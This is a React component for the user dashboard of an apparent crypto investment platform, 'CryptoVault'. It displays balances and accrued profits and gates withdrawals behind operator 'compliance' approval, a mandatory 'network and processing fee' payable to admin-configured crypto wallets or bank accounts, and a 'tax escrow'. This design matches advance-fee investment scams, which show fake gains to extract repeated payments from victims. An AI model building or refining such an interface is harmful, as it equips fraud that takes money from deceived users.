  return (
    <div className="dash">
      <ToastContainer toasts={toasts} onDismiss={dismissToast} />
      {renderMobileMenu()}

      {/* Header */}
      <header className="dash-header">
        <div className="dash-logo">
          <span className="logo-icon">◈</span>
          <span className="logo-text">CryptoVault</span>
        </div>

        <div className="dash-header-right">
          <div className="user-pill desktop-only">
            <div className="user-avatar">{user.full_name[0] || 'U'}</div>
            <span>{user.full_name}</span>
          </div>

          <button
            type="button"
            className="btn-mobile-toggle"
            onClick={() => setMobileMenuOpen(true)}
            aria-label="Open mobile navigation"
          >
            ☰
          </button>

          <button type="button" className="btn-logout desktop-only" onClick={logout}>
            Logout
          </button>
        </div>
      </header>

      <main className="dash-main">
        {/* Greeting */}
        <div className="greeting">
          <div className="greeting-header">
            <div>
              <h1>
                Welcome back, <span className="gradient-text">{user.full_name.split(' ')[0]}</span> 👋
              </h1>
              <p className="subtitle">Real-time institutional investment overview</p>
            </div>
            <button
              type="button"
              className="btn-secondary btn-refresh-dash desktop-only"
              onClick={refreshUserData}
              title="Refresh balances and requests"
            >
              ⟳ Refresh
            </button>
          </div>
        </div>

        {/* Investment status banner */}
        {user.investment_status === 'pending' && (
          <div className="inv-status-banner">
            <span className="inv-status-icon">⏳</span>
            <div>
              <strong>Investment Settlement Pending Confirmation</strong>
              <p>
                We are currently reconciling your{' '}
                {user.payment_method === 'crypto' ? 'crypto deposit' : 'bank wire'}{' '}
                {user.investment_amount ? `of ${fmt(user.investment_amount)}` : ''} for the{' '}
                <strong>{user.plan}</strong> tier. Your dashboard will fully unlock upon settlement.
              </p>
            </div>
          </div>
        )}

        {/* Balance Cards */}
        <div className="cards-row">
          <div className="card card-balance">
            <div className="card-top-bar" />
            <div className="card-label">Total Balance</div>
            <div className="card-value">{fmt(Number(user.balance_usd))}</div>
            <div className="card-sub">Principal invested capital</div>
          </div>

          <div className="card card-profit">
            <div className="card-top-bar" />
            <div className="card-label">Total Profit</div>
            <div className="card-value profit-val">+{fmt(Number(user.profit_usd))}</div>
            <div className="card-sub">+{profitPct}% accrued yield</div>
          </div>

          <div
            className="card card-plan"
            onClick={() => setPage('plan-select')}
            title="Click to view or upgrade your tier"
            role="button"
            tabIndex={0}
          >
            <div className="card-top-bar" />
            <div className="card-label">Investment Plan ↗</div>
            <div className="card-value plan-val">{user.plan || 'Select Tier'}</div>
            <div className="card-sub">
              Tax rate: {user.tax_percent}% • Tap to change tier
            </div>
          </div>

          <div className="card card-payout">
            <div className="card-top-bar" />
            <div className="card-label">Net Payout</div>
            <div className="card-value">{fmt(netPayout)}</div>
            <div className="card-sub">
              After {user.tax_percent}% deduction ({fmt(tax)})
            </div>
          </div>
        </div>

        {/* Withdrawal Gates */}
        <section className="section" id="sec-gates">
          <h2 className="section-title">Withdrawal Clearance Requirements</h2>
          <div className="gates">
            {/* Gate 1: Admin Approval */}
            <div className={`gate ${user.withdrawal_approved ? 'gate-ok' : 'gate-pending'}`}>
              <div className="gate-icon">{user.withdrawal_approved ? '✅' : '⏳'}</div>
              <div>
                <div className="gate-name">Institutional Clearance</div>
                <div className="gate-desc">
                  {user.withdrawal_approved
                    ? 'Withdrawal cleared and approved by compliance'
                    : 'Awaiting compliance desk sign-off and risk review'}
                </div>
              </div>
              <div
                className={`gate-badge ${
                  user.withdrawal_approved ? 'badge-ok' : 'badge-pending'
                }`}
              >
                {user.withdrawal_approved ? 'Approved' : 'Pending'}
              </div>
            </div>

            {/* Gate 2: Fee Progress */}
            <div className={`gate gate-fee-card ${feeFullyPaid ? 'gate-ok' : 'gate-locked'}`}>
              <div className="gate-icon">{feeFullyPaid ? '✅' : '🔒'}</div>
              <div className="gate-fee-body">
                <div className="gate-fee-header">
                  <div>
                    <div className="gate-name">Network &amp; Processing Fee</div>
                    <div className="gate-desc">
                      {feeFullyPaid
                        ? `All processing fees (${fmt(withdrawalFee)}) have been settled in full.`
                        : `A mandatory network fee of ${fmt(
                            withdrawalFee
                          )} is required prior to capital dispatch.`}
                    </div>
                  </div>
                  <div
                    className={`gate-badge ${feeFullyPaid ? 'badge-ok' : 'badge-locked'}`}
                  >
                    {feeFullyPaid ? '✅ Settled' : '🔒 Pending'}
                  </div>
                </div>

                <div className="fee-progress-wrap">
                  <div className="fee-progress-header">
                    <span className="fee-progress-title">Fee Settlement Progress</span>
                    <span className="fee-progress-pct">{feeProgress.toFixed(0)}% Settled</span>
                  </div>
                  <div className="fee-progress-bar">
                    <div
                      className={`fee-progress-fill ${feeFullyPaid ? 'fill-complete' : ''}`}
                      style={{ width: `${feeProgress}%` }}
                    />
                  </div>

                  <div className="fee-stats-grid">
                    <div className="fee-stat-box">
                      <span className="fee-stat-label">Fee Required</span>
                      <span className="fee-stat-value">{fmt(withdrawalFee)}</span>
                    </div>
                    <div className="fee-stat-box">
                      <span className="fee-stat-label">Amount Settled</span>
                      <span className="fee-stat-value text-profit">{fmt(feePaid)}</span>
                    </div>
                    <div className="fee-stat-box">
                      <span className="fee-stat-label">Remaining Balance</span>
                      <span
                        className={`fee-stat-value ${
                          feeRemaining > 0 ? 'text-danger' : 'text-profit'
                        }`}
                      >
                        {fmt(feeRemaining)}
                      </span>
                    </div>
                    <div className="fee-stat-box">
                      <span className="fee-stat-label">Lock Status</span>
                      <span
                        className={`fee-status-badge ${
                          feeFullyPaid ? 'status-paid' : 'status-locked'
                        }`}
                      >
                        {feeFullyPaid ? 'Unlocked' : 'Locked'}
                      </span>
                    </div>
                  </div>

                  {!feeFullyPaid && (
                    <div className="fee-action-row">
                      <button
                        type="button"
                        className="btn-fee-instructions"
                        onClick={() => setShowFeeModal(true)}
                      >
                        💳 Pay Processing Fee ({fmt(feeRemaining)} needed) →
                      </button>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Gate 3: Tax Rate */}
            <div className="gate gate-info">
              <div className="gate-icon">💰</div>
              <div>
                <div className="gate-name">Tax &amp; Regulatory Escrow ({user.tax_percent}%)</div>
                <div className="gate-desc">
                  {fmt(tax)} will be withheld automatically — you will receive {fmt(netPayout)}
                </div>
              </div>
              <div className="gate-badge badge-info">{user.tax_percent}%</div>
            </div>
          </div>
        </section>

        {/* Withdrawal Form */}
        <section className="section" id="sec-withdraw">
          <h2 className="section-title">Request Capital Withdrawal</h2>
          {canWithdraw ? (
            <div className="form-card">
              <div className="withdrawal-amount-display">
                <div className="wd-label">Approved Payout Amount</div>
                <div className="wd-amount">{fmt(netPayout)}</div>
                <div className="wd-breakdown">
                  <span>
                    Gross balance: <strong>{fmt(total)}</strong>
                  </span>
                  <span>
                    Tax deduction ({user.tax_percent}%):{' '}
                    <strong className="text-danger">−{fmt(tax)}</strong>
                  </span>
                  <span>
                    Net disbursed: <strong className="profit-val">{fmt(netPayout)}</strong>
                  </span>
                </div>
              </div>
              <form onSubmit={e => handleWithdrawal(e, netPayout)}>
                <div className="field">
                  <label>Destination Wallet / IBAN Address</label>
                  <input
                    type="text"
                    placeholder="e.g. 0x... or 1A1z... destination address"
                    value={wWallet}
                    onChange={e => setWWallet(e.target.value)}
                    required
                  />
                </div>
                {wError && <div className="alert alert-error">{wError}</div>}
                {wSuccess && <div className="alert alert-success">{wSuccess}</div>}
                <button type="submit" className="btn-primary" disabled={wLoading}>
                  {wLoading ? 'Transmitting Request…' : `Withdraw ${fmt(netPayout)} →`}
                </button>
              </form>
            </div>
          ) : (
            <div className="locked-box">
              <div className="locked-emoji">🔐</div>
              <h3>Withdrawal Clearance Pending</h3>
              <p>
                {feeRemaining > 0
                  ? `Please settle the outstanding network fee of ${fmt(
                      feeRemaining
                    )} to unlock immediate withdrawal clearance.`
                  : !user.withdrawal_approved
                  ? 'All processing fees are fully settled. Awaiting administrative clearance to release capital.'
                  : 'Complete clearance requirements above to unlock withdrawal.'}
              </p>
              <div className="locked-actions">
                {feeRemaining > 0 ? (
                  <button
                    type="button"
                    className="btn-primary"
                    style={{ maxWidth: '320px', margin: '18px auto 0' }}
                    onClick={() => setShowFeeModal(true)}
                  >
                    💳 Settle Remaining Fee ({fmt(feeRemaining)}) →
                  </button>
                ) : (
                  <button
                    type="button"
                    className="btn-secondary"
                    style={{ maxWidth: '280px', margin: '18px auto 0' }}
                    onClick={refreshUserData}
                  >
                    ⟳ Check Approval Status
                  </button>
                )}
              </div>
            </div>
          )}
        </section>

        {/* History */}
        {requests.length > 0 && (
          <section className="section" id="sec-history">
            <h2 className="section-title">Withdrawal Activity</h2>
            <div className="history-table">
              {requests.map(r => {
                const btcAmt = btcPrice && btcPrice > 0 ? r.amount_usd / btcPrice : null;
                const dt = new Date(r.requested_at);
                const etOpts = { timeZone: 'America/New_York' } as const;
                const dateStr = dt.toLocaleDateString('en-US', {
                  year: 'numeric',
                  month: 'short',
                  day: 'numeric',
                  ...etOpts,
                });
                const timeStr = dt.toLocaleTimeString('en-US', {
                  hour: '2-digit',
                  minute: '2-digit',
                  second: '2-digit',
                  timeZoneName: 'short',
                  ...etOpts,
                });
                return (
                  <div
                    className="history-row-v2"
                    key={r.id}
                    onClick={() => setSelectedRequest(r)}
                    role="button"
                    tabIndex={0}
                    title="Click to view full transaction receipt"
                  >
                    <div className="hist-left">
                      <div className="hist-usd">{fmt(r.amount_usd)}</div>
                      {btcAmt !== null && (
                        <div className="hist-btc">₿ {btcAmt.toFixed(8)} BTC</div>
                      )}
                    </div>
                    <div className="hist-center">
                      <div className="hist-wallet-full">{r.wallet_address}</div>
                      <div className="hist-datetime">
                        📅 {dateStr} &nbsp;•&nbsp; 🕐 {timeStr}
                      </div>
                    </div>
                    <div className="hist-right">
                      <div className={`status-badge status-${r.status}`}>{r.status}</div>
                      <div className="hist-expand-hint">tap to expand</div>
                    </div>
                  </div>
                );
              })}
            </div>
          </section>
        )}
      </main>

      {/* Fee Payment Instructions Modal */}
      {showFeeModal && paymentSettings && (
        <div className="modal-overlay" onClick={() => setShowFeeModal(false)}>
          <div className="modal-box" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>💳 Network Processing Fee Settlement</h3>
              <button
                type="button"
                className="modal-close"
                onClick={() => setShowFeeModal(false)}
                aria-label="Close modal"
              >
                ✕
              </button>
            </div>
            <div className="modal-fee-content">
              <div className="modal-fee-summary">
                <div className="modal-fee-summary-row">
                  <span>Total Fee Required:</span>
                  <strong>{fmt(withdrawalFee)}</strong>
                </div>
                <div className="modal-fee-summary-row">
                  <span>Amount Settled:</span>
                  <strong className="text-profit">{fmt(feePaid)}</strong>
                </div>
                <div className="modal-fee-summary-row highlight">
                  <span>Remaining Balance:</span>
                  <strong className="text-danger">{fmt(feeRemaining)}</strong>
                </div>
              </div>

              {paymentSettings.crypto_wallet && (
                <div className="payment-details" style={{ marginTop: '16px' }}>
                  <div className="payment-details-title">₿ Direct Crypto Transfer</div>
                  <div className="payment-detail-row">
                    <span>Network</span>
                    <strong>{paymentSettings.crypto_network || 'Bitcoin (BTC)'}</strong>
                  </div>
                  <div className="payment-detail-row wallet-row">
                    <span>Deposit Address</span>
                    <div className="wallet-address-box">
                      <code>{paymentSettings.crypto_wallet}</code>
                      <button
                        type="button"
                        className={`btn-copy ${
                          copiedKey === 'fee-crypto' ? 'btn-copied' : ''
                        }`}
                        onClick={() =>
                          copyToClipboard(
                            paymentSettings.crypto_wallet,
                            'Fee deposit address',
                            'fee-crypto'
                          )
                        }
                      >
                        {copiedKey === 'fee-crypto' ? '✓ Copied' : 'Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {paymentSettings.bank_name && (
                <div className="payment-details" style={{ marginTop: '16px' }}>
                  <div className="payment-details-title">🏦 Bank Wire Instructions</div>
                  <div className="payment-detail-row">
                    <span>Bank Name</span>
                    <strong>{paymentSettings.bank_name}</strong>
                  </div>
                  <div className="payment-detail-row">
                    <span>Beneficiary Name</span>
                    <strong>{paymentSettings.bank_account_name}</strong>
                  </div>
                  <div className="payment-detail-row">
                    <span>Account Number</span>
                    <div className="wallet-address-box">
                      <code>{paymentSettings.bank_account_number}</code>
                      <button
                        type="button"
                        className={`btn-copy ${
                          copiedKey === 'fee-bank' ? 'btn-copied' : ''
                        }`}
                        onClick={() =>
                          copyToClipboard(
                            paymentSettings.bank_account_number,
                            'Account number',
                            'fee-bank'
                          )
                        }
                      >
                        {copiedKey === 'fee-bank' ? '✓ Copied' : 'Copy'}
                      </button>
                    </div>
                  </div>
                  {paymentSettings.bank_routing && (
                    <div className="payment-detail-row">
                      <span>Routing</span>
                      <strong>{paymentSettings.bank_routing}</strong>
                    </div>
                  )}
                  {paymentSettings.bank_swift && (
                    <div className="payment-detail-row">
                      <span>SWIFT</span>
                      <strong>{paymentSettings.bank_swift}</strong>
                    </div>
                  )}
                </div>
              )}

              <p className="payment-note" style={{ marginTop: '14px' }}>
                💡 After transmitting your fee payment of <strong>{fmt(feeRemaining)}</strong>, our
                settlement desk will reconcile the ledger and activate your withdrawal clearance.
              </p>

              <button
                type="button"
                className="btn-primary"
                style={{ marginTop: '20px' }}
                onClick={() => {
                  setShowFeeModal(false);
                  showToast('Fee modal dismissed. Use refresh to check status.', 'info');
                }}
              >
                Close Instructions
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Withdrawal Detail Modal */}
      {selectedRequest && (() => {
        const r = selectedRequest;
        const btcAmt = btcPrice && btcPrice > 0 ? r.amount_usd / btcPrice : null;
        const dt = new Date(r.requested_at);
        const etOpts = { timeZone: 'America/New_York' } as const;
        const dateStr = dt.toLocaleDateString('en-US', {
          weekday: 'long',
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          ...etOpts,
        });
        const timeStr = dt.toLocaleTimeString('en-US', {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          timeZoneName: 'short',
          ...etOpts,
        });
        return (
          <div className="modal-overlay wd-detail-overlay" onClick={() => setSelectedRequest(null)}>
            <div className="modal-box wd-detail-box" onClick={e => e.stopPropagation()}>
              <div className="modal-header">
                <h3>📄 Withdrawal Receipt</h3>
                <button
                  type="button"
                  className="modal-close"
                  onClick={() => setSelectedRequest(null)}
                  aria-label="Close modal"
                >
                  ✕
                </button>
              </div>

              {/* Big amount hero */}
              <div className="wd-detail-hero">
                <div className="wd-detail-label">Amount Requested</div>
                <div className="wd-detail-usd">{fmt(r.amount_usd)}</div>
                {btcAmt !== null && (
                  <div className="wd-detail-btc">≈ ₿ {btcAmt.toFixed(8)} BTC</div>
                )}
                {btcPrice && (
                  <div className="wd-detail-rate">@ ${btcPrice.toLocaleString()} / BTC</div>
                )}
              </div>

              {/* Details grid */}
              <div className="wd-detail-grid">
                <div className="wd-detail-row">
                  <span className="wd-detail-key">Status</span>
                  <span className={`status-badge status-${r.status}`} style={{ fontSize: '13px' }}>
                    {r.status}
                  </span>
                </div>
                <div className="wd-detail-row">
                  <span className="wd-detail-key">Date</span>
                  <span className="wd-detail-val">{dateStr}</span>
                </div>
                <div className="wd-detail-row">
                  <span className="wd-detail-key">Time (EST)</span>
                  <span className="wd-detail-val">{timeStr}</span>
                </div>
                <div className="wd-detail-row wd-wallet-row">
                  <span className="wd-detail-key">Destination Address</span>
                  <div className="wd-wallet-wrap">
                    <code className="wd-wallet-code">{r.wallet_address}</code>
                    <button
                      type="button"
                      className={`btn-copy ${copiedKey === `wd-${r.id}` ? 'btn-copied' : ''}`}
                      onClick={() =>
                        copyToClipboard(
                          r.wallet_address,
                          'Destination address',
                          `wd-${r.id}`
                        )
                      }
                    >
                      {copiedKey === `wd-${r.id}` ? '✓ Copied' : 'Copy'}
                    </button>
                  </div>
                </div>
                <div className="wd-detail-row">
                  <span className="wd-detail-key">Transaction ID</span>
                  <div className="wd-wallet-wrap">
                    <code className="wd-detail-val" style={{ fontSize: '11px', opacity: 0.8 }}>
                      {r.id}
                    </code>
                    <button
                      type="button"
                      className={`btn-copy ${copiedKey === `tx-${r.id}` ? 'btn-copied' : ''}`}
                      onClick={() => copyToClipboard(r.id, 'Transaction ID', `tx-${r.id}`)}
                    >
                      {copiedKey === `tx-${r.id}` ? '✓ Copied' : 'Copy'}
                    </button>
                  </div>
                </div>
              </div>

              <button
                type="button"
                className="btn-primary"
                style={{ marginTop: '24px' }}
                onClick={() => setSelectedRequest(null)}
              >
                Close Receipt
              </button>
            </div>
          </div>
        );
      })()}
    </div>
  );
}
